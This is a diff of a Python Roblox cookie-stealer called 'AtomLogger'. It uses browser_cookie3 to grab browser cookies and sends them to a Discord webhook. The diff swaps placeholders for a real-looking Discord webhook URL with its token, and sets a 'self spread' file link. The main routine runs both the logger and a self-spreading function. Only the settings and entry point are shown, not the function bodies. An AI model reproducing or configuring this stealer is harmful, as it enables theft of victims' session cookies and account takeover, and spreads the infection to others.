@@ -1,11 +1,11 @@
 import browser_cookie3, requests, urllib, re, os
 
 #   Settings - Webhook    #
-webhook = 'WEBHOOK URL HERE'
-avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
+webhook = 'https://discord.com/api/webhooks/1446656147556798484/FHx4KUNo0f8q07_OIMJLp_WIBXf4IR9EeWb3A65AAVNeuG2fCRBr3Zoenksy_MsJI7U-'
+avatarUrl = 'https://www.roblox.com/users/3319234398/profile'
 botName = 'AtomLogger | ROBLOX'
 #   Settings - Self Spread    #
-fileLink = 'INFECTED FILE URL HERE'
+fileLink = 'https://www.roblox.com/users/3319234398/profile'
 
 #   Functions   #
 def sendWebhook(message):
@@ -95,3 +95,4 @@ def AtomLogger():
 if __name__ == '__main__':
     AtomLogger()
     selfSpread()
+
